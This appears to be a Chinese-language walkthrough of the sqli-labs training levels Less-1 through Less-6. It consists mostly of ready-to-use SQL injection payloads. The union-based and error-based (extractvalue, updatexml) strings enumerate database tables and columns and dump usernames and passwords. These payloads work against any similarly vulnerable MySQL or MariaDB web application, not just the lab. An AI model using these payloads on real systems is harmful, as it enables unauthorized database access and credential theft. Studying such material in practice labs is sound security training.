Less-1

输入单引号后报错，从报错信息中应该是字符型注入，注释后面的单引号#或者--+

爆表：0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

爆字段：0'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+

查值：0'union select 1,group_concat(username,password),3 from users --+

Less-2

跟第一关一样，输入参数然后再加上单引号试一下，从报错信息中看到我们的参数已经带入到数据库中查询了，应该是数字型注入，应该也是３个指定列，其实注入语句跟第一关相比就是把参数后面的单引号去掉就好

爆表：0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

爆字段：0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+

查值：0 union select 1,group_concat(username,password),3 from users --+

Less-3

输入参数加上单引号

报错信息：You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1

看一下报错信息，参数应该是放在了单引号和括号里面，所以我们的语句就在单引号后面加个括号

爆表：0') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

爆字段：0') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+

查值：0')union select 1,group_concat(username,password),3 from users --+

Less-4

第四关，GET类型的双引号报错注入，输入双引号从报错信息可以看到参数应该也是在括号里面的，在Less-3的基础上把单引号变成双引号就可以了

爆表：0") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

爆字段：0") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+

查值：0")union select 1,group_concat(username,password),3 from users --+

Less-5

当输入参数加上单引号的时候，通过页面返回的信息可以看到参数被带入到了单引号中，再用之前的爆表的语句，但是发现页面显示You are in...........，应该是语句不能使用了，但是这个地方会显示出报错信息，我们就可以使用报错注入

爆表：?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+

爆字段：1?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+

查值：?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+

Less-6

跟第五差不多，把单引号变成双引号就会了

爆表：?id=1" and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+

爆字段：1?id=1" and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+

查值：?id=1" and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+

或者使用update函数

爆表：updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+

爆字段：updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='user'),0x7e),1)--+

查值：updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1)--+
